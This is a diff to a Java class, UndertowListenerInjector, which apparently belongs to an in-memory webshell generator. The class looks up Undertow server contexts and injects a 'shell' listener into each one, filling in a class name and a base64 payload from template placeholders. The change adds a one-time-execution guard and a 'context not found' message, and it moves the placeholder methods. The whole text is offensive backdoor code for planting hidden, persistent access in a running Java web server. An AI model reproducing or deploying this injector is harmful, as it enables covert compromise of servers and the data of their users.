@@ -20,18 +20,32 @@ import java.util.zip.GZIPInputStream;
 public class UndertowListenerInjector {
 
     private String msg = "";
+    private static boolean ok = false;
+
+    public String getClassName() {
+        return "{{className}}";
+    }
+
+    public String getBase64String() throws IOException {
+        return "{{base64Str}}";
+    }
 
     public UndertowListenerInjector() {
+        if (ok) {
+            return;
+        }
         Set<Object> contexts = null;
         try {
             contexts = getContext();
         } catch (Throwable throwable) {
             msg += "context error: " + getErrorMessage(throwable);
         }
-        if (contexts != null) {
+        if (contexts == null) {
+            msg += "context not found";
+        } else {
             for (Object context : contexts) {
-                msg += ("context: [" + getContextRoot(context) + "] ");
                 try {
+                    msg += ("context: [" + getContextRoot(context) + "] ");
                     Object shell = getShell(context);
                     inject(context, shell);
                     msg += "[/*] ready\n";
@@ -40,6 +54,7 @@ public class UndertowListenerInjector {
                 }
             }
         }
+        ok = true;
         System.out.println(msg);
     }
 
@@ -58,14 +73,6 @@ public class UndertowListenerInjector {
             return c + "(/)";
         }
         return c + "(" + r + ")";
-    }
-
-    public String getClassName() {
-        return "{{className}}";
-    }
-
-    public String getBase64String() throws IOException {
-        return "{{base64Str}}";
     }
 
     public Set<Object> getContext() throws Exception {
